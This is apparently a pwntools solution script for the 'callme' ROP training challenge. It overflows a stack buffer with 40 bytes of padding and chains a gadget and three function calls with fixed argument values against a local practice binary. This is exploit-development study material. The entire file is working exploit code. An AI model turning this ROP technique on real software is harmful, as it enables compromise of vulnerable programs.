from pwn import *

elf=ELF('./callme')

target=elf.process()

gadget=p64(0x000000000040093c)

callme_one = p64(0x400720)
callme_two = p64(0x400740)
callme_three = p64(0x4006f0)

one_int=p64(0xdeadbeefdeadbeef)
two_int=p64(0xcafebabecafebabe)
three_int=p64(0xd00df00dd00df00d)

rop_chain_1=gadget+one_int+two_int+three_int+callme_one
rop_chain_2=gadget+one_int+two_int+three_int+callme_two
rop_chain_3=gadget+one_int+two_int+three_int+callme_three

rop_chain=rop_chain_1+rop_chain_2+rop_chain_3

payload=b'A'*40 + rop_chain


target.sendline(payload)

print(target.recvall())
